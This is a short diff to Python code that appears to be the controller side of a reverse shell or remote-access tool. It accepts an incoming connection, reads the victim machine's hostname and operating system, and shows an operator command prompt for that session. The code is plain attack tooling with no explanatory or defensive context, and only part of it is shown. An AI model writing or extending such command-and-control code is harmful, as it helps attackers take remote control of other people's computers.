@@ -32,21 +32,23 @@ def acceptSocket():
 	global conn
 	global addr
 	global hostname
+	global operatingSystem
 
 	try:
 		conn, addr = s.accept()
 		print('Session Opend at %s:%s \n'%(addr[0], addr[1]))
-		hostname = conn.recv(1024).decode()
-		print(hostname)
+		data = conn.recv(1024).decode().split(',')
+		hostname = str(data[0])
+		operatingSystem = str(data[1])
 		menu()
 	except socket.error as msg:
 		print('Socket Accepting Error:', msg)
 
 def menu():
 	while True:
-		cmd = input(str(addr[0]) + '@' + str(hostname) + '> ')
+		cmd = input(hostname + '@' + operatingSystem + '> ')
 		while cmd == "":
-			cmd = input(str(addr[0]) + '@' + str(hostname) + '> ')
+			cmd = input(hostname + '@' + operatingSystem + '> ')
 		if cmd == 'quit':
 			conn.close()
 			s.close()
